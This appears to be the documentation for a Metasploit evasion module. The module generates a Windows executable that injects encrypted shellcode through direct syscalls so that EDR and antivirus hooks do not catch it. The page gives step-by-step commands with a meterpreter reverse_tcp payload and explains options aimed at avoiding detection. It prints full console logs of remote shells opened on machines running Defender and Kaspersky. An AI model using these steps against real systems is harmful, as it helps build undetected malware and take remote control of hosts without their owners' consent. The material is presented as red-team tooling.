## Description
This module lets you create a Windows executable that injects a specific payload/shellcode in memory bypassing EDR/AVs Windows API hooking technique via direct syscalls achieved by Mingw's inline assembly.
Mingw needs (x86_64) to be installed on the system and in the PATH enviroment variable.

The technique used is based on Sorting by System Call Address, by enumerating all Zw* stubs in the EAT of NTDLL.dll and then sorting them by address, it still works even if syscall indices were overwritten by AVs.
[For more details](https://www.mdsec.co.uk/2020/12/bypassing-user-mode-hooks-and-direct-invocation-of-system-calls-for-red-teams/)

## Verification Steps
steps using a meterpreter/reverse_tcp payload on a 64-bits target:

1. `use evasion/windows/syscall_inject`
1. `set LHOST <local IP>`
1. `set payload windows/x64/meterpreter/reverse_tcp`
1. `handler -p windows/x64/meterpreter/reverse_tcp -H <local IP> -P <local port>`
1. `run`
1. Make sure that "Automatic Sample Submission" is off in Windows Defender
1. Copy the generated executable file to a specified location (e.g. target PC)  
1. Run it
1. Verify that you got a session without being blocked by Antimalware

## Options

### CIPHER
Encryption algorithm used to encrypt the payload. Available ones (CHACHA, RC4)

### FILENAME
Filename for the generated evasive file file. The default is random.

### JUNK
Adding random data such as names, emails and GUIDs to the final executable

### SLEEP
Specify how much the program sleeps in milliseconds prior to execute the shellcode's thread (NtCreateThread).
NOTE: the longer the better chance to avoid being detected.

## Advanced

### OptLevel
Optimization level passed to the compiler (Mingw)

## Scenarios
### Windows 10 (x64) version 20H2 with Defender
```
msf6 > use evasion/windows/syscall_inject 
[*] Using configured payload windows/x64/meterpreter/reverse_tcp
msf6 evasion(windows/syscall_inject) > set SLEEP 10000
SLEEP => 10000
msf6 evasion(windows/syscall_inject) > set LHOST 192.168.1.104
LHOST => 192.168.1.104
msf6 evasion(windows/syscall_inject) > run

[+] pYlCSOAeW.exe stored at /Users/user/.msf4/local/pYlCSOAeW.exe
msf6 evasion(windows/syscall_inject) > cp  /Users/user/.msf4/local/pYlCSOAeW.exe ~
[*] exec: cp  /Users/user/.msf4/local/pYlCSOAeW.exe ~

msf6 evasion(windows/syscall_inject) > handler -p windows/x64/meterpreter/reverse_tcp -H 192.168.1.104 -P 4444
[*] Payload handler running as background job 1.

[*] Started reverse TCP handler on 192.168.1.104:4444 
msf6 evasion(windows/syscall_inject) > [*] Sending stage (200262 bytes) to 192.168.1.103
[*] Meterpreter session 3 opened (192.168.1.104:4444 -> 192.168.1.103:53007) at 2021-08-01 17:08:43 +0300

msf6 evasion(windows/syscall_inject) > sessions -i 3 
[*] Starting interaction with 3...

meterpreter > sysinfo 
Computer        : DESKTOP-822593D
OS              : Windows 10 (10.0 Build 19042).
Architecture    : x64
System Language : en_US
Domain          : WORKGROUP
Logged On Users : 2
Meterpreter     : x64/windows
meterpreter > exit
[*] Shutting down Meterpreter...

[*] 192.168.1.103 - Meterpreter session 3 closed.  Reason: User exit
```
### Windows server 2012 (x64) with Kaspersky 10.2.6.3733
```
msf6 > use evasion/windows/syscall_inject
[*] Using configured payload windows/x64/meterpreter/reverse_tcp
msf6 evasion(windows/syscall_inject) > set payload windows/x64/meterpreter_bind_tcp 
payload => windows/x64/meterpreter_bind_tcp
msf6 evasion(windows/syscall_inject) > set RHOST 192.168.225.76
RHOST => 192.168.225.76
msf6 evasion(windows/syscall_inject) > set LPORT 10156
LPORT => 10156
msf6 evasion(windows/syscall_inject) > set cipher rc4
cipher => rc4
msf6 evasion(windows/syscall_inject) > run

[+] ShP.exe stored at /Users/medicus/.msf4/local/ShP.exe
msf6 evasion(windows/syscall_inject) > cp /Users/medicus/.msf4/local/ShP.exe ~
[*] exec: cp /Users/medicus/.msf4/local/ShP.exe ~

msf6 evasion(windows/syscall_inject) > handler -p windows/x64/meterpreter_bind_tcp -H 192.168.225.76 -P 10156
[*] Payload handler running as background job 0.

[*] Started bind TCP handler against 192.168.225.76:10156
msf6 evasion(windows/syscall_inject) > [*] Meterpreter session 1 opened (0.0.0.0:0 -> 192.168.225.76:10156) at 2021-08-01 17:32:05 +0300

msf6 evasion(windows/syscall_inject) > sessions -i 1 
[*] Starting interaction with 1...

meterpreter > sysinfo 
Computer        : LABCE28
OS              : Windows 2012 (6.2 Build 9200).
Architecture    : x64
System Language : en_US
Domain          : WORKGROUP
Logged On Users : 386
Meterpreter     : x64/windows
meterpreter > exit
[*] Shutting down Meterpreter...

[*] 192.168.225.76 - Meterpreter session 1 closed.  Reason: User exit
```

